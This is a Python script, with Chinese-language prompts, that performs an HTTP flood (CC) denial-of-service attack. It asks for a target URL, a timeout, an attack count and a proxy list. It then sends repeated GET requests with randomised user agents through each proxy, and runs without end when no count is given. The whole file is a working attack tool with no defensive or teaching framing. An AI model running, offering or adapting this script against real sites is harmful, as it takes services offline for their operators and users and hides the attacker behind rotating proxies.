# -*- coding: utf-8 -*-
import os
import requests
from fake_useragent import UserAgent

def cc(url, timeout, index, proxy_path):
    UA = UserAgent()
    headers = {'User-Agent': UA.random}
    i, success, fail = 0, 0, 0

    def go():
        nonlocal i, success, fail

        if os.path.exists(proxy_path):
            with open(proxy_path, 'r') as f:
                iplines = f.readlines()
                for ip in iplines:
                    if index and i >= int(index):
                        print('----------')
                        print('運行結束')
                        return True

                    ip = ip.strip()
                    proxies = {
                        'http': 'http://' + ip,
                        'https': 'http://' + ip,
                    }
                    try:
                        requests.get(url, headers=headers, timeout=float(timeout), proxies=proxies)
                    except Exception as e:
                        print(f'Fail: {ip}')
                        fail += 1
                    else:
                        print(f'Success: {ip}')
                        success += 1
                    finally:
                        i += 1

                print(f'Total: {i}')
                print(f'Success: {success}')
                print(f'Fail: {fail}')
        else:
            print('代理文件不存在')

    if not index:
        while True:
            go()
    else:
        go()

if __name__ == "__main__":
    url = input('請輸入網址：')
    timeout = input('請輸入超時時間：')
    index = input('請輸入攻擊次數（爲空則持續攻擊）：')
    proxy_path = input('請輸入代理文件路徑：')

    cc(url, timeout, index, proxy_path)
